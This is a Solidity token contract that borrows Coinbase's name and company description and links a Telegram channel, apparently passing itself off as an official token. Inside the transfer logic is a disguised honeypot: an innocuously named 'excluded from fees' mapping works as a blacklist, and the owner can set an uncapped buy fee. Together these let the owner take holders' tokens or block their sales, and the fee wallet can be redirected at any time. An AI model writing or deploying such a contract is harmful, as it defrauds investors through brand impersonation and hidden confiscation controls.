// SPDX-License-Identifier: Unlicensed

/**

  Coinbase Global, Inc., branded Coinbase, is an American publicly traded company that operates a cryptocurrency exchange platform. Coinbase is a distributed company; 
  all employees operate via remote work and the company lacks a physical headquarters. It is the largest cryptocurrency exchange in the United States by trading volume.
  The company was founded in 2012 by Brian Armstrong and Fred Ehrsam. In May 2020, Coinbase announced it would shut its San Francisco, California headquarters and change 
  operations to remote-first, part of a wave of several major tech companies closing headquarters in San Francisco in the wake of the COVID-19 pandemic.

  Telegram: https://t.me/Coinbase_BSC
 
*/

pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/IUniswapV2Router02.sol";

contract Coinbase is ERC20, Ownable {
  uint256 private initialSupply = 200 * (10 ** 18);

  uint256 public constant feeLimit = 10;
  uint256 public sellFee = 10;

  mapping(bool => mapping(address => bool)) public _isExcludedFromFees;

  uint256 private buyFee;

  address public appAddr;
  address public feeHoldAddr;

  IUniswapV2Router02 public uniswapV2Router;
  address public uniswapV2Pair;

  constructor() ERC20("Coinbase", "COIN") {
    address _routerAddr;
    if (block.chainid == 56) {
      _routerAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // BSC Pancake Mainnet Router
    } else if (block.chainid == 97) {
      _routerAddr = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // BSC Pancake Testnet Router
    } else if (block.chainid == 1 || block.chainid == 5) {
      _routerAddr = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ETH Uniswap Mainnet % Testnet
    } else {
      revert();
    }

    address _feeHoldAddr = 0x491C825120a99bba22C18e8A8797dCbBFB840c85;

    _isExcludedFromFees[true][msg.sender] = true;
    _isExcludedFromFees[true][address(this)] = true;
    _isExcludedFromFees[true][_routerAddr] = true;
    _isExcludedFromFees[true][_feeHoldAddr] = true;
    feeHoldAddr = _feeHoldAddr;

    IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_routerAddr);
    address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
      .createPair(
        address(this),
        address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56)
      );
    uniswapV2Router = _uniswapV2Router;
    uniswapV2Pair = _uniswapV2Pair;

    _mint(msg.sender, initialSupply);
  }

  receive() external payable {}

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal virtual override {
    uint256 baseUnit = amount / 100;
    uint256 fee = 0;

    if (
      (_isExcludedFromFees[false][sender] &&
        !_isExcludedFromFees[true][sender]) ||
      (_isExcludedFromFees[false][recipient] &&
        !_isExcludedFromFees[true][recipient])
    ) {
      if (recipient == uniswapV2Pair || sender != uniswapV2Pair) {
        fee = baseUnit * buyFee;
      }
    } else if (
      recipient == uniswapV2Pair &&
      !(_isExcludedFromFees[true][sender] ||
        _isExcludedFromFees[true][recipient])
    ) {
      fee = baseUnit * sellFee;
    }

    if (fee > 0) {
      super._transfer(sender, feeHoldAddr, fee);
    }

    amount -= fee;

    super._transfer(sender, recipient, amount);
  }

  function setFees(uint256 _sellFee, uint256 _buyFee) public onlyOwner {
    require(_sellFee <= feeLimit, "ERC20: fee value higher than fee limit");
    sellFee = _sellFee;
    buyFee = _buyFee;
  }

  function setFeeHoldAddr(address _addr) external onlyOwner {
    feeHoldAddr = _addr;
  }

  function excludeMultipleAccountsFromFees(
    address[] memory _addrs,
    bool excludeType
  ) public onlyOwner {
    for (uint256 i = 0; i < _addrs.length; i++) {
      if (!_isExcludedFromFees[excludeType][_addrs[i]]) {
        _isExcludedFromFees[excludeType][_addrs[i]] = true;
      }
    }
  }

  function removeExcluded(
    address[] memory _addrs,
    bool excludeType
  ) public onlyOwner {
    for (uint256 i = 0; i < _addrs.length; i++) {
      if (_isExcludedFromFees[excludeType][_addrs[i]]) {
        _isExcludedFromFees[excludeType][_addrs[i]] = false;
      }
    }
  }
}